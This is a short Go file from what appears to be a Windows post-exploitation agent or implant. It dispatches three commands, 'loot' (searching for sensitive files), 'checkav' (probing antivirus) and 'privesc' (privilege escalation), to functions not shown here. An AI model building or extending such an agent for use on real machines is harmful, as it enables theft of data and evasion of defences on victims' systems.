//go:build windows
// +build windows

package agent

import (
	"log"
	"sOPown3d/internal/agent/commands"
)

func executeLootCommand() string {
	log.Println("💰 Executing loot command...")
	return commands.SearchSensitiveFiles()
}

func executeCheckAVCommand() string {
	log.Println("🛡️ Executing checkav command...")
	return commands.CheckAV()
}

func executePrivescCommand() string {
	log.Println("⚡ Executing privesc command...")
	return commands.Privesc()
}
